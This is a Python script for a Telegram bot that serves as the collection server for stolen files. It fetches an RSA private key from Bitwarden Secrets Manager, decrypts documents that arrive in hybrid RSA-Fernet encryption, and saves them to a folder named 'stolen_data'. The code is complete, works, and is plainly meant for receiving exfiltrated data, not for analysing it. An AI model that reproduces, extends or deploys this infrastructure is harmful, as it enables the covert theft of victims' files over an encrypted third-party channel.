import telebot
import os
from bitwarden_sdk import BitwardenClient, ClientSettings
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
from dotenv import load_dotenv

load_dotenv()
SAVE_FOLDER = "./stolen_data"
TOKEN = os.getenv("TELEGRAM_TOKEN")
BWS_ACCESS_TOKEN = os.getenv("BWS_ACCESS_TOKEN")
SECRET_ID = os.getenv("SECRET_ID")
bot = telebot.TeleBot(TOKEN)

if not os.path.exists(SAVE_FOLDER):
    os.makedirs(SAVE_FOLDER)

def get_private_key_from_cloud():
    print("[*] Звертаюся до Bitwarden за приватним ключем...")
    try:
        client = BitwardenClient(ClientSettings(
            identity_url="https://identity.bitwarden.com",
            api_url="https://api.bitwarden.com"
        ))
        client.auth().login_access_token(BWS_ACCESS_TOKEN)
        
        secret = client.secrets().get(SECRET_ID)
        key_text = secret.data.value
        
        loaded_key = serialization.load_pem_private_key(
            key_text.encode(),
            password=None,
        )
        print("[+] УСПІХ")
        return loaded_key
        
    except Exception as e:
        print(f"[-] КРИТИЧНА ПОМИЛКА BITWARDEN: {e}")
        exit()

private_key = get_private_key_from_cloud()

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        encrypted_fernet_key = downloaded_file[:256]
        encrypted_data = downloaded_file[256:]

        fernet_key = private_key.decrypt(
            encrypted_fernet_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        f = Fernet(fernet_key)
        decrypted_data = f.decrypt(encrypted_data)

        original_name = message.document.file_name.replace(".enc", "")
        save_path = os.path.join(SAVE_FOLDER, original_name)

        with open(save_path, 'wb') as new_file:
            new_file.write(decrypted_data)

        print(f"[+] Got file: {original_name}")
        bot.reply_to(message, f"Great! {original_name} I got file")

    except Exception as e:
        print(f"Помилка: {e}")

if __name__ == "__main__":
    print("[*] Сервер запущено. Чекаю на дані...")
    bot.polling(none_stop=True)
